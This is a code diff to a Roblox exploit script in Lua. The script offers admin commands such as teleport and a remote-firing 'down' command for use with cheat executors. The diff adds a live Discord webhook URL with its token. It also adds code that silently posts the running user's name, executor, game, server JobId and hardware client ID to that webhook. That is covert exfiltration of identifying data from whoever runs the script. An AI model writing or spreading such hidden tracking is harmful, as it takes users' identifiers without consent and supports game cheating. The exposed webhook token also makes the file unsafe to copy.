@@ -7,6 +7,10 @@ local Admins = {
 	["1049c4"] = true,
 }
 
+local Webhook = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2"
+local Executor = identifyexecutor()
+local ExecutorText = ""
+
 local function FindUser(Name)
 	if #Name < 3 then
 		return nil
@@ -31,7 +35,7 @@ local commands = {
 	teleport = function(targetPlayer)
 		LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players"):WaitForChild("JoeheIsTheGOAT").Character.HumanoidRootPart.CFrame
 	end,
-	down = function(targetPlayer)
+	down = function(targetPlayer) -- for shinden
 		local args = {
 			[1] = 10000
 		}
@@ -60,3 +64,55 @@ game:GetService("Players").PlayerAdded:Connect(function(player)
 		end)
 	end
 end)
+
+if Executor == "Wave" then
+	ExecutorText = "Wave"
+elseif Executor == "Solara" then
+	ExecutorText = "Solara"
+elseif Executor == "Synapse Z" then
+	ExecutorText = "Synapse Z"
+else
+	ExecutorText = "Unknown"
+end
+
+local embed = {
+	["title"] = LocalPlayer.Name,
+	["color"] = 0x2f5bc7,
+	["fields"] = {
+		{
+			["name"] = "Executor",
+			["value"] = EXECUTOR_TEXT,
+			["inline"] = true
+		},
+		{
+			["name"] = "Game",
+			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+			["inline"] = true
+		},
+		{
+			["name"] = "JobId",
+			["value"] = game.JobId,
+			["inline"] = true
+		},
+		{
+			["name"] = "RbxAnalytics HWID",
+			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+			["inline"] = true
+		}
+	}
+}
+
+local payload = {
+	["embeds"] = {embed},
+}
+
+local httpRequest = {
+	Url = Webhook,
+	Method = "POST",
+	Headers = {
+		["Content-Type"] = "application/json"
+	},
+	Body = game:GetService("HttpService"):JSONEncode(payload)
+}
+
+request(httpRequest)
